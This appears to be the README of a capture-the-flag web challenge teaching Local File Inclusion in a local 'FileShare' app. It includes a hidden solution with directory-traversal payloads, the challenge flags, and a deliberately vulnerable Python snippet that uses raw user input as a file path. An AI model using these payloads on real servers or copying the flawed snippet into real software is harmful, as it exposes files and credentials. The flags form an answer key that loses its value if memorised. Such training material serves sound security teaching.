# Challenge 4: Local File Inclusion (Medium-High)

## Description
FileShare is a document management system that allows users to view different pages through a page parameter. However, the developers might not have properly validated user input, potentially allowing access to files outside the intended directory.

## Objective
Exploit the Local File Inclusion (LFI) vulnerability to read sensitive files and find the flag.

## Difficulty
⭐⭐⭐ Medium-High

## Setup
1. Install Python dependencies:
   ```bash
   pip install -r requirements.txt
   ```
2. Run the application:
   ```bash
   python app.py
   ```
3. Or use Docker:
   ```bash
   docker-compose up -d
   ```
4. Navigate to `http://localhost:5003`

## Hints
- Notice how the `page` parameter loads different content
- The application tries to load files from the `pages/` directory first
- If a file doesn't exist in `pages/`, it tries the direct path
- Try directory traversal with `../` to access files outside the pages folder
- Look for sensitive files like `flag.txt`, `admin_notes.txt`, config files, or log files
- The `/debug` endpoint might give you useful information about the file structure

## Flag Format
`CTF{...}`

## Solution
<details>
<summary>Click to reveal solution</summary>

This challenge demonstrates Local File Inclusion (LFI) vulnerability where user input is used to include files without proper validation.

**Step 1: Understand the vulnerability**
The application uses the `page` parameter to load files:
- Normal usage: `?page=home` loads `pages/home.html`
- If the file doesn't exist in `pages/`, it tries the direct path

**Step 2: Basic LFI**
Try accessing files directly:
- `?page=flag.txt` - Access the flag file directly
- `?page=admin_notes.txt` - Access admin notes

**Step 3: Directory traversal**
If direct access doesn't work, try directory traversal:
- `?page=../flag.txt`
- `?page=../admin_notes.txt`
- `?page=../config/database.conf`
- `?page=../logs/access.log`

**Step 4: Explore file structure**
Visit `/debug` to see the file structure, then target specific files:
- `?page=config/app.conf`
- `?page=logs/error.log`

**Successful payloads:**
- `http://localhost:5003/?page=flag.txt`
- `http://localhost:5003/?page=admin_notes.txt`
- `http://localhost:5003/?page=../flag.txt`

**Flags found:**
- Main flag: `CTF{l0c4l_f1l3_1nclus10n_pwn3d}`
- Bonus flag: `CTF{d1r3ct0ry_tr4v3rs4l_m4st3r}` (in admin_notes.txt)

**Additional sensitive information:**
- Database credentials in `config/database.conf`
- Application secrets in `config/app.conf`
- System logs in `logs/` directory
- Admin passwords in `admin_notes.txt`

### How it works:
The vulnerable code:
```python
file_path = f'pages/{page}.html'
if not os.path.exists(file_path):
    file_path = page  # Direct path usage - VULNERABLE!
```

This allows attackers to:
1. Access any file on the system that the web server can read
2. Use directory traversal (`../`) to escape the intended directory
3. Read sensitive configuration files, logs, and other data

</details>

## Learning Objectives
- Understanding Local File Inclusion (LFI) vulnerabilities
- Learning directory traversal techniques
- Understanding the importance of input validation and sanitization
- Learning about file system security and access controls
- Understanding how to properly handle file inclusion in web applications